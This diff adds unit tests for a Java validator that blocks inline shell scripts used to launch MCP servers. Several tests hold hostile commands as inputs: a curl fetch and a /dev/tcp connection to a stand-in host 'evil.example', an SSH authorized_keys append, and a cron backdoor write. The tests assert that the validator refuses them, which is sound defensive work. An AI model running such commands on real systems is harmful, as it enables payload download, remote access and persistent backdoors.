@@ -117,4 +117,57 @@ class McpLifecycleManagerStaticTest {
         String error = McpLifecycleManager.validateStdioCommand("/etc/passwd");
         assertThat(error).contains("not executable");
     }
+
+    // ── rev-125: inline-script validation (Hermes mcp_security.py parity) ──
+
+    @Test
+    void inlineScriptEgressIsRefused() {
+        String error = McpLifecycleManager.validateInlineScript(
+            "bash", java.util.List.of("-c", "curl http://evil.example/payload"));
+        assertThat(error).isNotNull().contains("egress");
+    }
+
+    @Test
+    void inlineScriptPersistenceIsRefused() {
+        String error = McpLifecycleManager.validateInlineScript(
+            "/bin/bash", java.util.List.of("-c", "echo KEY >> ~/.ssh/authorized_keys"));
+        assertThat(error).isNotNull().contains("persistence");
+    }
+
+    @Test
+    void inlineScriptCronPersistenceIsRefused() {
+        String error = McpLifecycleManager.validateInlineScript(
+            "sh", java.util.List.of("-c", "echo 'x' >> /etc/cron.d/backdoor"));
+        assertThat(error).isNotNull().contains("persistence");
+    }
+
+    @Test
+    void inlineScriptDevTcpIsRefused() {
+        String error = McpLifecycleManager.validateInlineScript(
+            "bash", java.util.List.of("-c", "cat < /dev/tcp/evil.example/443"));
+        assertThat(error).isNotNull().contains("egress");
+    }
+
+    @Test
+    void benignShellArgsPass() {
+        // A legitimate interpreter use with no egress/persistence
+        String error = McpLifecycleManager.validateInlineScript(
+            "bash", java.util.List.of("-c", "echo hello"));
+        assertThat(error).isNull();
+    }
+
+    @Test
+    void nonInterpreterCommandArgsNotChecked() {
+        // npx/node/python — inline-script rules don't apply (Hermes:
+        // basename not in _SHELL_INTERPRETERS)
+        String error = McpLifecycleManager.validateInlineScript(
+            "npx", java.util.List.of("-y", "some-mcp-server"));
+        assertThat(error).isNull();
+    }
+
+    @Test
+    void nullArgsPass() {
+        assertThat(McpLifecycleManager.validateInlineScript("bash", null)).isNull();
+        assertThat(McpLifecycleManager.validateInlineScript(null, java.util.List.of("x"))).isNull();
+    }
 }
